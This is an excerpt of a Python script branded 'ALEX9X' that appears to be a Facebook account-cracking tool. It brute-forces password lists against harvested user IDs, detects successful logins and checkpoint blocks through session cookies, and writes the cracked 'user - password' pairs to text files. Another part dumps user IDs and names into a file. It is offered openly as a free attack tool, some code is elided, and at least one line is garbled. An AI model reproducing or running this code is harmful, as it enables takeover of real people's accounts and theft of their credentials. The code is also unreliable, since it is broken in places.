...
from concurrent.futures import ThreadPoolExecutor as ALEX9X
from concurrent.futures import ThreadPoolExecutor as ALEX9X
from datetime import datetime
from bs4 import BeautifulSoup
...
def main():
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING ALEX9X TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mALEX9X\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mALEX9X-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mALEX9X-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mALEX9X\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[ALEX9X-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('ALEX9X_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[ALEX9X-CP] %s | %s%s      ' % (user,pw,tahun(user)))
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mALEX9X\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
banner = """
  ...
  \033[0;91m ██   ██ ███████ ███████ ██   ██  █████  ██   ██ 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m ALEX9X│\033[1;37m• \033[1;36mTHIS TOOL IS FREE \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Ex Adnan│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +12135621228│\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m Not Allow│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
